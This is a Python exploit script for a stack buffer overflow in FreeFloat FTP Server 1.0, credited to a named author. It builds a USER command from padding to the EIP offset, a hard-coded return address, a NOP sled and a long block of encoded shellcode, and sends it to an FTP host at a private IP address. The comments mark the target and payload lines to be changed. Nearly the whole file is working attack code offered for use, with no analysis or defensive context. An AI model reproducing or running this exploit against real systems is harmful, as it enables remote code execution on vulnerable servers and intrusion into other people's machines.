#FreeFloatFTP server ver.1.0 BufferOverflow exploit
#Author : Shivam Sawant
#Host Machine : Windows 7 32Bit SP1

#!/usr/bin/python
import sys, socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#Change This -
s.connect(('192.168.116.137',21))


#EIP offset 230
#ESP offset 242

buffer = "A" * 230
buffer += "\x5b\x4e\x0c\x76"
buffer += "B" * 4
buffer += "C" * 8
buffer += "\x90" * 30

#Change This -

buffer += "\xbd\xef\xc5\xa3\x80\xd9\xc7\xd9\x74\x24\xf4\x5f\x29"
buffer += "\xc9\xb1\x63\x83\xef\xfc\x31\x6f\x11\x03\x6f\x11\xe2"
buffer += "\x1a\x7b\x2e\xa8\x08\xda\xeb\x6c\x09\x97\x2f\x9b\xf1"
buffer += "\x71\xf9\xd2\x5c\xb3\x89\x06\x5d\xc3\x7b\xa4\x04\xf7"
buffer += "\x72\x01\x6a\x1f\xf8\x4c\x8d\x3c\xcb\x15\xfa\xbb\x87"
buffer += "\xc9\xa4\x4d\x6d\x87\xfb\x2d\x87\x29\x0b\xa9\x61\x93"
buffer += "\xc4\x9a\xbc\x40\xbc\xe2\x86\x5b\x71\x74\xa0\x15\xc8"
buffer += "\x63\xcd\xb7\x39\x64\x32\xcf\x98\x75\xa5\x49\x96\xfc"
buffer += "\x13\x61\x06\x5c\x96\xda\x1d\x1d\x20\xe3\x49\xfc\x03"
buffer += "\xad\x75\x8f\xd3\x05\x16\xec\x29\xd1\xc7\xeb\x0b\x2a"
buffer += "\xd1\x33\xe5\x7b\x74\xae\x3c\x97\x0e\xd2\x96\xb6\x9e"
buffer += "\x95\xae\x0b\xf5\xcf\x9f\x3f\x76\xa3\x25\x6c\x11\x6a"
buffer += "\x5b\x0f\x73\xf9\x40\x85\x17\x80\x72\xc1\x7d\x02\xee"
buffer += "\x5b\x6e\xc8\xc0\x45\x43\xf0\x08\xc2\x0e\x89\xf3\x2f"
buffer += "\x76\x02\x5b\xf1\x25\x97\xbd\x28\x95\x06\x46\x8f\xbc"
buffer += "\x85\xa1\xb8\xa9\x56\xf1\x40\xe5\x32\x3c\x76\x46\x08"
buffer += "\x22\x2f\x2d\x60\xcd\x53\xc6\xdf\x6f\xe0\x09\xf3\xd4"
buffer += "\x88\x56\x9f\xad\x31\xbf\xcc\x9e\xc0\x98\xb1\x4e\xd2"
buffer += "\x10\x5f\x70\xed\xfd\x5d\xd7\xdc\x35\x26\xcc\x68\x66"
buffer += "\x33\x42\xd8\x59\x68\xbb\xbe\x12\xf5\x4c\x3a\x41\x77"
buffer += "\x12\xcf\xe4\xe5\xb3\xbb\xfa\x9c\x55\x86\xed\x51\x73"
buffer += "\xef\x9f\x1a\x3a\xa3\x21\x6a\x24\x01\x66\x8b\x68\x08"
buffer += "\x68\xbd\xbd\xa9\xe0\x75\xe1\x5b\x51\x2a\x1f\x32\xe7"
buffer += "\x19\x9b\x73\x45\x2a\x4d\xfd\x2f\x39\xf7\x42\x1d\xa0"
buffer += "\xc5\x08\xb8\x14\x85\x64\x64\x4a\x5f\xd4\x28\x7b\x6b"
buffer += "\x5a\x98\xf1\x1f\x26\x44\x86\x07\xc4\x64\x0c\x63\x23"
buffer += "\x60\x18\xd5\x7b\x83\x52\x09\x3f\x4c\xe5\x84\x87\x09"
buffer += "\x85\x06\x2c\xe4\x02\xbc\x32\x8e\x36\x17\xe6\x65\x1d"
buffer += "\xc0\x01\x93\x20\x79\xa8\x7e\xe6\x85\xa8\xc4\x41\x84"
buffer += "\x89\xdb\x48\x5e\x3a\xdd\xb5\xca\x6a\x71\x91\x12\xdc"
buffer += "\x2d\xc2\x1d\x4f\x2e\x9d\x36\x38\xeb\x77\x3c\xbe\x11"
buffer += "\xea\x46\xf8\xc7\xc7\x7a\x78\x5c\x47\x34\x31\xcd\x3c"
buffer += "\x36\x36\xa8\xfc\x66\x83"


s.recv(1024)
s.send("USER " + buffer + "\r\n")
s.close()
sys.exit()
